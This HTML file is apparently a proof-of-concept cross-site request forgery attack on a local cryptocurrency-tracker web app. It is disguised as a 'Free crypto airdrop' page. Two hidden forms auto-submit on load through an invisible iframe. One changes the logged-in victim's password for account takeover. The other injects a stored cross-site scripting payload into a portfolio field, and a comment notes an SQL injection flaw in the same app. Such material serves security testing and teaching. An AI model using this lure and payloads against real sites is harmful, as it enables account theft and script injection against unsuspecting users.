<!doctype html>
<!--
  csrf_addpw.html — CSRF proof-of-concept (change victim password + add holding)

  Demo: a logged-in victim opens this page. Two auto-submitting forms fire on
  load. Neither profile.php nor add_holding.php validates a CSRF token, so the
  victim's session is used to:
    1. change their account password to "hacked123"  -> account takeover
    2. inject a stored-XSS holding into their portfolio

  Both forms target a hidden iframe so the victim sees nothing.
-->
<html>
<head><meta charset="utf-8"><title>Free crypto airdrop 🚀</title></head>
<body onload="document.getElementById('f1').submit(); setTimeout(function(){document.getElementById('f2').submit();}, 400);">
  <h1>Claiming your airdrop...</h1>
  <p>Please wait.</p>

  <iframe name="sink" style="display:none"></iframe>

  <!-- VULN target: CSRF on password change (account takeover) -->
  <form id="f1" action="http://localhost/crypto-tracker/profile.php" method="post" target="sink">
    <input type="hidden" name="action" value="password">
    <input type="hidden" name="password" value="hacked123">
  </form>

  <!-- VULN target: CSRF on add_holding, carrying a stored-XSS payload in notes -->
  <form id="f2" action="http://localhost/crypto-tracker/add_holding.php" method="post" target="sink">
    <input type="hidden" name="coin_id" value="1">
    <input type="hidden" name="amount" value="0.1">
    <input type="hidden" name="buy_price" value="1">
    <!-- Quote-free payload: single quotes would break out of the app's
         INSERT ... '$notes' string and abort the insert (its own SQLi flaw). -->
    <input type="hidden" name="notes" value="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
  </form>
</body>
</html>
